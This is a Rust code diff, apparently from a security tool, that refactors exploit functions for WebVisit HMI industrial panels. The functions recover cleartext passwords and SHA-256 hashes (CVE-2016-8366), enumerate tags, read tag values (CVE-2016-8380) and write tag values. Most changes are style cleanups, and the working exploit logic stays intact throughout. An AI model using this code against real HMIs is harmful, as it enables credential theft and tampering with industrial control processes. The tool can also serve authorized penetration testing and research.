@@ -6,16 +6,9 @@ pub struct PasswordEntry {
     pub user_level: String,
     pub password: Option<String>,
     pub hash: Option<String>,
-    pub entry_type: String,
 }
 
-#[derive(Debug, Clone)]
-pub struct TagEntry {
-    pub name: String,
-    pub value: Option<String>,
-}
-
-/// Retrieve passwords from WebVisit HMI (CVE-2016-8366). Pass `port = 0` for default (80).
+/// Retrieve passwords from `WebVisit` HMI (CVE-2016-8366). Pass `port = 0` for default (80).
 pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntry>> {
     let effective_port = if port == 0 { 80 } else { port };
     let agent = ureq::AgentBuilder::new()
@@ -80,13 +73,12 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
                 let pass_len = after[0] as usize;
                 if after.len() > pass_len {
                     let password =
-                        String::from_utf8_lossy(&after[1..1 + pass_len]).to_string();
+                        String::from_utf8_lossy(&after[1..=pass_len]).to_string();
                     println!("Password for user level {user_level}: {password}");
                     results.push(PasswordEntry {
                         user_level,
                         password: Some(password),
                         hash: None,
-                        entry_type: "cleartext".into(),
                     });
                 }
             }
@@ -99,7 +91,6 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
                     user_level,
                     password: None,
                     hash: Some(hash_val),
-                    entry_type: "sha256".into(),
                 });
             }
         }
@@ -111,7 +102,7 @@ pub fn retrieve_passwords(target_ip: &str, port: u16) -> Result<Vec<PasswordEntr
     Ok(results)
 }
 
-/// Retrieve the tag list from a WebVisit HMI. Pass `port = 0` for default (80).
+/// Retrieve the tag list from a `WebVisit` HMI. Pass `port = 0` for default (80).
 pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
     let effective_port = if port == 0 { 80 } else { port };
     let agent = ureq::AgentBuilder::new()
@@ -154,7 +145,7 @@ pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
     for line in tcr_body.lines() {
         if line.starts_with("#!-- N =") {
             found_header = true;
-            let count = line.split('=').nth(1).map(str::trim).unwrap_or("?");
+            let count = line.split('=').nth(1).map_or("?", str::trim);
             println!("Found {count} tags:");
         }
         if found_header && !line.contains('#') && line.contains(';') {
@@ -170,6 +161,7 @@ pub fn get_tags(target_ip: &str, port: u16) -> Result<(String, Vec<String>)> {
 
 /// Read current values for a list of tags (CVE-2016-8380). Pass `port = 0` for default (80).
 pub fn read_tag_values(target_ip: &str, port: u16, tags: &[String]) -> Result<Vec<(String, String)>> {
+    use std::fmt::Write;
     let effective_port = if port == 0 { 80 } else { port };
     let mut body = format!(
         "<body><item_list_size>{}</item_list_size><item_list>",
@@ -182,7 +174,7 @@ pub fn read_tag_values(target_ip: &str, port: u16, tags: &[String]) -> Result<Ve
             .replace('<', "&lt;")
             .replace('>', "&gt;")
             .replace('"', "&quot;");
-        body.push_str(&format!("<i><n>{escaped}</n></i>"));
+        let _ = write!(body, "<i><n>{escaped}</n></i>");
     }
     body.push_str("</item_list></body>");
 
@@ -237,13 +229,14 @@ pub fn write_tag_value(target_ip: &str, port: u16, tag_name: &str, value: &str) 
 }
 
 fn percent_encode(s: &str) -> String {
+    use std::fmt::Write;
     let mut out = String::new();
     for byte in s.bytes() {
         match byte {
             b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                 out.push(byte as char);
             }
-            other => out.push_str(&format!("%{other:02X}")),
+            other => { let _ = write!(out, "%{other:02X}"); }
         }
     }
     out
@@ -259,15 +252,12 @@ fn split_bytes<'a>(data: &'a [u8], sep: &[u8]) -> Vec<&'a [u8]> {
     let mut parts = Vec::new();
     let mut start = 0;
     while start <= data.len() {
-        match find_subsequence(&data[start..], sep) {
-            Some(pos) => {
-                parts.push(&data[start..start + pos]);
-                start += pos + sep.len();
-            }
-            None => {
-                parts.push(&data[start..]);
-                break;
-            }
+        if let Some(pos) = find_subsequence(&data[start..], sep) {
+            parts.push(&data[start..start + pos]);
+            start += pos + sep.len();
+        } else {
+            parts.push(&data[start..]);
+            break;
         }
     }
     parts
